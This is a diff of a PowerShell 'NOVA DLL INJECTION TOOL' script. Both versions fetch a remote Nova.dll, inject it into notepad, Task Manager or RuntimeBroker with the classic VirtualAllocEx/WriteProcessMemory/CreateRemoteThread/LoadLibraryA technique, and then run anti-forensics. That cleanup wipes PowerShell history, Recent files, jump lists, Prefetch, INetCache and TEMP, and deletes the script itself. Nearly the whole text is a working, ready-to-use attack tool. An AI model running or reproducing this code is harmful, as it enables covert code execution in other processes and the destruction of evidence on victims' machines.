@@ -16,24 +16,20 @@ if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
     }
 }
 
-# === Fixed LookupFunc ===
+# === LookupFunc ===
 function LookupFunc {
     Param ($moduleName, $functionName)
-    
     $signature = @'
     [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
     public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-    
     [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
     public static extern IntPtr GetModuleHandle(string lpModuleName);
 '@
-    
     if (-not ([System.Management.Automation.PSTypeName]'Win32.Kernel32').Type) {
         $kernel32 = Add-Type -MemberDefinition $signature -Name 'Kernel32' -Namespace 'Win32' -PassThru
     } else {
         $kernel32 = [Win32.Kernel32]
     }
-    
     $hModule = $kernel32::GetModuleHandle($moduleName)
     return $kernel32::GetProcAddress($hModule, $functionName)
 }
@@ -65,130 +61,55 @@ function getDelegateType {
     return $type.CreateType()
 }
 
-# === 1. Clear Temp Folder ===
+# === 1. Prepare Temp ===
 Write-Host "[+] Preparing environment..." -ForegroundColor Cyan
 $tempDir = $env:TEMP
 try {
     Get-ChildItem -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
-}
-catch {
-    # Silent fail
-}
+} catch {}
 
-# === 2. Download DLL to %TEMP% ===
+# === 2. Download DLL + Images ===
 $randomGuid = [System.Guid]::NewGuid().ToString()
-$dllFileName = "$randomGuid.dll"
-$dllPath = Join-Path $env:TEMP $dllFileName
+$dllPath = Join-Path $tempDir "$randomGuid.dll"
 
-# URL สำหรับ Nova.dll
-$urls = @(
-    "https://raw.githubusercontent.com/novaxstorex/Nova/main/Nova.dll",
-    "https://raw.githubusercontent.com/novaxstorex/Nova/main/Nova.dll?raw=true",
-    "https://github.com/novaxstorex/Nova/raw/main/Nova.dll",
-    "https://raw.githubusercontent.com/novaxstorex/Nova/main/nova.dll",
-    "https://raw.githubusercontent.com/novaxstorex/Nova/main/NOVA.dll"
-)
+$baseUrl = ""
 
-Write-Host "[+] Downloading Nova.dll..." -ForegroundColor Cyan
+$files = @{
+    $dllPath                          = "$baseUrl/Nova.dll"
+    "$tempDir\logo.png"               = "$baseUrl/logo.png"
+    "$tempDir\low.png"                = "$baseUrl/low.png"
+    "$tempDir\medium.png"             = "$baseUrl/medium.png"
+    "$tempDir\high.png"               = "$baseUrl/high.png"
+}
+
+[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
+
+Write-Host "[+] Downloading Nova.dll and assets..." -ForegroundColor Cyan
 
 $downloaded = $false
-
-# ลองดาวน์โหลดแบบเงียบๆ ไม่แสดง URL
-foreach ($url in $urls) {
+foreach ($dest in $files.Keys) {
+    $url = $files[$dest]
     try {
-        $webClient = New-Object System.Net.WebClient
-        $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
-        [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 -bor [System.Net.SecurityProtocolType]::Tls11 -bor [System.Net.SecurityProtocolType]::Tls
-        
-        $webClient.DownloadFile($url, $dllPath)
-        $webClient.Dispose()
-        
-        if (Test-Path $dllPath) {
-            $fileSize = (Get-Item $dllPath).Length
-            if ($fileSize -gt 0) {
-                $downloaded = $true
-                break
-            } else {
-                Remove-Item $dllPath -Force -ErrorAction SilentlyContinue
-            }
-        }
-    }
-    catch {
-        if (Test-Path $dllPath) {
-            Remove-Item $dllPath -Force -ErrorAction SilentlyContinue
-        }
-        continue
+        $wc = New-Object System.Net.WebClient
+        $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
+        $wc.DownloadFile($url, $dest)
+        $wc.Dispose()
+    } catch {
+        # Silent fail for images
     }
 }
 
-# ถ้ายังไม่ได้ดาวน์โหลด ลองวิธีอื่นแบบเงียบๆ
-if (-not $downloaded) {
-    foreach ($url in $urls) {
-        try {
-            Invoke-WebRequest -Uri $url -OutFile $dllPath -UseBasicParsing -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" -ErrorAction SilentlyContinue
-            
-            if ((Test-Path $dllPath) -and ((Get-Item $dllPath).Length -gt 0)) {
-                $downloaded = $true
-                break
-            }
-        }
-        catch {
-            if (Test-Path $dllPath) {
-                Remove-Item $dllPath -Force -ErrorAction SilentlyContinue
-            }
-            continue
-        }
-    }
+# Verify DLL
+if ((Test-Path $dllPath) -and ((Get-Item $dllPath).Length -gt 0)) {
+    $downloaded = $true
+    Write-Host "[+] DLL ready ($([math]::Round((Get-Item $dllPath).Length/1KB, 2)) KB)" -ForegroundColor Green
+} else {
+    Write-Host "[!] Failed to download Nova.dll" -ForegroundColor Red
+    Read-Host "Press Enter to exit"
+    exit 1
 }
 
-# ถ้ายังดาวน์โหลดไม่ได้ ให้ใช้ DLL ที่มีในเครื่อง
-if (-not $downloaded) {
-    # ตรวจสอบว่า Nova.dll มีอยู่ในเครื่องหรือไม่
-    $localDllPaths = @(
-        ".\Nova.dll",
-        "$env:TEMP\Nova.dll",
-        "$env:USERPROFILE\Desktop\Nova.dll",
-        "$env:USERPROFILE\Downloads\Nova.dll"
-    )
-    
-    $foundLocal = $false
-    foreach ($localPath in $localDllPaths) {
-        if (Test-Path $localPath) {
-            try {
-                Copy-Item $localPath $dllPath -Force
-                if ((Get-Item $dllPath).Length -gt 0) {
-                    Write-Host "[+] Using local Nova.dll" -ForegroundColor Green
-                    $downloaded = $true
-                    $foundLocal = $true
-                    break
-                }
-            }
-            catch {
-                continue
-            }
-        }
-    }
-    
-    # ถ้ายังไม่มีให้สร้างไฟล์ dummy (แต่จะไม่ทำงาน)
-    if (-not $downloaded) {
-        Write-Host "[!] Warning: Could not download Nova.dll" -ForegroundColor Yellow
-        Write-Host "[!] The injection may fail. Continuing anyway..." -ForegroundColor Yellow
-        # สร้างไฟล์เปล่าเพื่อไม่ให้ Script ผิดพลาด
-        New-Item -ItemType File -Path $dllPath -Force | Out-Null
-    }
-}
-
-# ตรวจสอบไฟล์ DLL (แบบไม่แสดงผลมาก)
-if (Test-Path $dllPath) {
-    $fileSize = (Get-Item $dllPath).Length
-    if ($fileSize -gt 0) {
-        Write-Host "[+] DLL ready ($([math]::Round($fileSize/1KB, 2)) KB)" -ForegroundColor Green
-    } else {
-        Write-Host "[!] Warning: DLL file is empty" -ForegroundColor Yellow
-    }
-}
-
-# === Process Selection Menu (Interactive) ===
+# === 3. Process Selection ===
 Clear-Host
 Write-Host "NOVA DLL INJECTION TOOL" -ForegroundColor Yellow
 Write-Host ""
@@ -201,18 +122,15 @@ Write-Host ""
 
 $proc = $null
 $targetProcess = ""
-$targetExe = ""
 $validChoice = $false
 
 do {
     $choice = Read-Host "Enter choice (1-3)"
     Write-Host ""
-    
+
     switch ($choice) {
         "1" {
             $targetProcess = "notepad"
-            $targetExe = "notepad.exe"
-            
             try {
                 $existingProc = Get-Process -Name "notepad" -ErrorAction SilentlyContinue | Select-Object -First 1
                 if ($existingProc) {
@@ -225,15 +143,12 @@ do {
                     $proc = Get-Process -Id $proc.Id -ErrorAction SilentlyContinue
                 }
                 $validChoice = $true
-            }
-            catch {
-                Write-Host "[!] Failed to start Notepad.exe: $($_.Exception.Message)" -ForegroundColor Red
+            } catch {
+                Write-Host "[!] Failed: $($_.Exception.Message)" -ForegroundColor Red
             }
         }
         "2" {
             $targetProcess = "Taskmgr"
-            $targetExe = "taskmgr.exe"
-            
             try {
                 $existingProc = Get-Process -Name "taskmgr" -ErrorAction SilentlyContinue | Select-Object -First 1
                 if ($existingProc) {
@@ -246,15 +161,12 @@ do {
                     $proc = Get-Process -Id $proc.Id -ErrorAction SilentlyContinue
                 }
                 $validChoice = $true
-            }
-            catch {
-                Write-Host "[!] Failed to start Task Manager: $($_.Exception.Message)" -ForegroundColor Red
+            } catch {
+                Write-Host "[!] Failed: $($_.Exception.Message)" -ForegroundColor Red
             }
         }
         "3" {
             $targetProcess = "RuntimeBroker"
-            $targetExe = "RuntimeBroker.exe"
-            
             try {
                 $proc = Get-Process -Name "RuntimeBroker" -ErrorAction SilentlyContinue | Select-Object -First 1
                 if ($proc) {
@@ -263,30 +175,25 @@ do {
                 } else {
                     Write-Host "[!] RuntimeBroker not found. Using Notepad as fallback..." -ForegroundColor Yellow
                     $targetProcess = "notepad"
-                    $targetExe = "notepad.exe"
                     $proc = Start-Process -FilePath "notepad.exe" -WindowStyle Normal -PassThru -ErrorAction Stop
                     Start-Sleep -Seconds 2
                     $proc = Get-Process -Id $proc.Id -ErrorAction SilentlyContinue
                     $validChoice = $true
                 }
-            }
-            catch {
-                Write-Host "[!] Failed to find RuntimeBroker: $($_.Exception.Message)" -ForegroundColor Red
+            } catch {
+                Write-Host "[!] Failed: $($_.Exception.Message)" -ForegroundColor Red
             }
         }
         default {
             Write-Host "[!] Invalid choice. Please enter 1, 2, or 3." -ForegroundColor Red
         }
     }
-    
+
     if (-not $validChoice) {
-        Write-Host "[!] Failed to get a valid process." -ForegroundColor Red
-        Write-Host "Press any key to try again..." -ForegroundColor Yellow
+        Write-Host "[!] Failed to get a valid process. Try again..." -ForegroundColor Red
         Read-Host
         Clear-Host
         Write-Host "NOVA DLL INJECTION TOOL" -ForegroundColor Yellow
-        Write-Host ""
-        Write-Host "Select target process for injection:" -ForegroundColor White
         Write-Host ""
         Write-Host "  [1] Notepad" -ForegroundColor Green
         Write-Host "  [2] Task Manager (Taskmgr)" -ForegroundColor Green
@@ -295,9 +202,8 @@ do {
     }
 } while (-not $validChoice -or -not $proc)
 
-# ตรวจสอบ process
 if (-not $proc) {
-    Write-Host "[!] No target process available. Exiting..." -ForegroundColor Red
+    Write-Host "[!] No target process. Exiting..." -ForegroundColor Red
     Read-Host "Press Enter to exit"
     exit 1
 }
@@ -305,56 +211,50 @@ if (-not $proc) {
 try {
     $proc = Get-Process -Id $proc.Id -ErrorAction Stop
 } catch {
-    Write-Host "[!] Process died or is no longer accessible. Exiting..." -ForegroundColor Red
+    Write-Host "[!] Process no longer accessible. Exiting..." -ForegroundColor Red
     Read-Host "Press Enter to exit"
     exit 1
 }
 
 $pid1 = $proc.Id
 Write-Host ""
-Write-Host "[+] Target: $targetProcess (PID: $pid1) [Admin Context]" -ForegroundColor Green
+Write-Host "[+] Target: $targetProcess (PID: $pid1)" -ForegroundColor Green
 Write-Host "[+] Injecting: Nova.dll" -ForegroundColor Green
 Write-Host ""
 
-# === Injection ===
+# === 4. Injection ===
 try {
     $OpenProcessDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
         (LookupFunc kernel32.dll OpenProcess),
         (getDelegateType @([UInt32], [UInt32], [Int]) ([IntPtr]))
     )
-    
     $VirtualAllocExDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
         (LookupFunc kernel32.dll VirtualAllocEx),
         (getDelegateType @([IntPtr], [IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))
     )
-    
     $WriteProcessMemoryDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
         (LookupFunc kernel32.dll WriteProcessMemory),
         (getDelegateType @([IntPtr], [IntPtr], [Byte[]], [Int], [IntPtr]) ([Bool]))
     )
-    
     $CreateRemoteThreadDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
         (LookupFunc kernel32.dll CreateRemoteThread),
         (getDelegateType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))
     )
-    
+
     Write-Host "[+] Opening process handle..." -ForegroundColor Cyan
     $hProcess = $OpenProcessDelegate.Invoke(0x001F0FFF, 0, $pid1)
-    
     if ($hProcess -eq [IntPtr]::Zero) {
-        Write-Host "[!] Failed to open process handle. Access Denied?" -ForegroundColor Red
-        Write-Host "[!] Trying with limited permissions..." -ForegroundColor Yellow
+        Write-Host "[!] Trying limited permissions..." -ForegroundColor Yellow
         $hProcess = $OpenProcessDelegate.Invoke(0x002A, 0, $pid1)
-        
         if ($hProcess -eq [IntPtr]::Zero) {
-            Write-Host "[!] Still failed to open process handle" -ForegroundColor Red
+            Write-Host "[!] Failed to open process handle" -ForegroundColor Red
             Read-Host "Press Enter to exit"
             exit 1
         }
     }
     Write-Host "[+] Process Handle: $hProcess" -ForegroundColor Green
-    
-    Write-Host "[+] Allocating memory in target process..." -ForegroundColor Cyan
+
+    Write-Host "[+] Allocating memory..." -ForegroundColor Cyan
     $addr = $VirtualAllocExDelegate.Invoke($hProcess, [IntPtr]::Zero, 0x1000, 0x3000, 0x40)
     if ($addr -eq [IntPtr]::Zero) {
         Write-Host "[!] Failed to allocate memory" -ForegroundColor Red
@@ -362,72 +262,54 @@ try {
         exit 1
     }
     Write-Host "[+] Allocated Memory: $addr" -ForegroundColor Green
-    
+
     [Byte[]]$dllNameBytes = [Text.Encoding]::ASCII.GetBytes($dllPath + "`0")
     [IntPtr]$outSize = [IntPtr]::Zero
-    
-    Write-Host "[+] Writing DLL path to target process..." -ForegroundColor Cyan
+
+    Write-Host "[+] Writing DLL path..." -ForegroundColor Cyan
     $res = $WriteProcessMemoryDelegate.Invoke($hProcess, $addr, $dllNameBytes, $dllNameBytes.Length, $outSize)
-    
     if (-not $res) {
         Write-Host "[!] Failed to write memory" -ForegroundColor Red
         Read-Host "Press Enter to exit"
         exit 1
     }
-    Write-Host "[+] Memory Written: $res" -ForegroundColor Green
-    
+
     $loadLibAddr = LookupFunc kernel32.dll LoadLibraryA
-    Write-Host "[+] LoadLibraryA Address: $loadLibAddr" -ForegroundColor Green
-    
-    Write-Host "[+] Creating remote thread to load Nova.dll..." -ForegroundColor Cyan
+    Write-Host "[+] Creating remote thread..." -ForegroundColor Cyan
     $hThread = $CreateRemoteThreadDelegate.Invoke($hProcess, [IntPtr]::Zero, 0, $loadLibAddr, $addr, 0, [IntPtr]::Zero)
-    
+
     if ($hThread -ne [IntPtr]::Zero) {
         Write-Host ""
-        Write-Host "[✓] INJECTION SUCCESSFUL!" -ForegroundColor Green
-        Write-Host "[✓] Thread Handle: $hThread" -ForegroundColor Green
-        Write-Host "[✓] Nova.dll loaded into $targetProcess (PID: $pid1)" -ForegroundColor Green
-        Write-Host "[✓] Nova DLL is now running in target process" -ForegroundColor Green
+        Write-Host "[+] INJECTION SUCCESSFUL!" -ForegroundColor Green
+        Write-Host "[+] Nova.dll loaded into $targetProcess (PID: $pid1)" -ForegroundColor Green
     } else {
-        Write-Host ""
-        Write-Host "[!] Injection failed (CreateRemoteThread returned Zero)" -ForegroundColor Red
-        Write-Host "[!] Try selecting a different process." -ForegroundColor Yellow
+        Write-Host "[!] Injection failed. Try a different process." -ForegroundColor Red
     }
-}
-catch {
-    Write-Host "[!] Error during injection: $($_.Exception.Message)" -ForegroundColor Red
-    Write-Host $_.ScriptStackTrace -ForegroundColor Yellow
+} catch {
+    Write-Host "[!] Error: $($_.Exception.Message)" -ForegroundColor Red
 }
 
-# === Enhanced Cleanup & Anti-Forensics ===
+# === 5. Cleanup ===
 Write-Host ""
-Write-Host "[+] Starting cleanup..." -ForegroundColor Cyan
+Write-Host "[+] Cleaning up..." -ForegroundColor Cyan
+Start-Sleep -Seconds 3
 
-# Clear PowerShell History
-[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory() 2>$null
+try { [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory() } catch {}
 $histPath = (Get-PSReadLineOption).HistorySavePath
-if (Test-Path $histPath) { 
-    try { Set-Content -Path $histPath -Value "" -Force -ErrorAction SilentlyContinue } catch {}
-}
+if (Test-Path $histPath) { try { Set-Content -Path $histPath -Value "" -Force } catch {} }
 
-# Clear Recent Files
-$recentPath = Join-Path $env:APPDATA "Microsoft\Windows\Recent"
-if (Test-Path $recentPath) {
-    Get-ChildItem -Path $recentPath -Force -ErrorAction SilentlyContinue | Remove-Item -Force -Recurse -ErrorAction SilentlyContinue
-}
-
-# Clear Jump Lists
-$jumpListPaths = @(
+$cleanPaths = @(
+    (Join-Path $env:APPDATA "Microsoft\Windows\Recent"),
     (Join-Path $env:APPDATA "Microsoft\Windows\Recent\AutomaticDestinations"),
-    (Join-Path $env:APPDATA "Microsoft\Windows\Recent\CustomDestinations")
+    (Join-Path $env:APPDATA "Microsoft\Windows\Recent\CustomDestinations"),
+    (Join-Path $env:LOCALAPPDATA "Microsoft\Windows\INetCache")
 )
-foreach ($path in $jumpListPaths) {
-    if (Test-Path $path) {
-        Get-ChildItem -Path $path -Force -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
+foreach ($p in $cleanPaths) {
+    if (Test-Path $p) {
+        Get-ChildItem -Path $p -Force -ErrorAction SilentlyContinue | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
     }
 }
 
-# Clear Prefetch
 $prefetchPath = "C:\Windows\Prefetch"
 for ($i = 0; $i -lt 3; $i++) {
     Start-Sleep -Seconds 1
@@ -436,38 +318,14 @@ for ($i = 0; $i -lt 3; $i++) {
     }
 }
 
-# Clear INetCache
-$ieCache = Join-Path $env:LOCALAPPDATA "Microsoft\Windows\INetCache"
-if (Test-Path $ieCache) {
-    Get-ChildItem -Path $ieCache -Recurse -Force -ErrorAction SilentlyContinue | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
-}
-
-# Clear Temp Folder
-$tempDir = $env:TEMP
 Get-ChildItem -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
 
-# Delete DLL
-Start-Sleep -Seconds 1
-if (Test-Path $dllPath) { 
-    try { 
-        Remove-Item $dllPath -Force -ErrorAction SilentlyContinue
-    } catch {
-        # Silent fail
-    }
-}
-
-# Delete script
-if ($PSCommandPath -and (Test-Path $PSCommandPath)) { 
-    try {
-        Remove-Item $PSCommandPath -Force -ErrorAction SilentlyContinue
-    } catch {
-        # Silent fail
-    }
+if ($PSCommandPath -and (Test-Path $PSCommandPath)) {
+    try { Remove-Item $PSCommandPath -Force -ErrorAction SilentlyContinue } catch {}
 }
 
 [GC]::Collect()
 [GC]::WaitForPendingFinalizers()
-Start-Sleep -Seconds 2
 
 Write-Host "[+] Cleanup complete" -ForegroundColor Green
 Write-Host ""
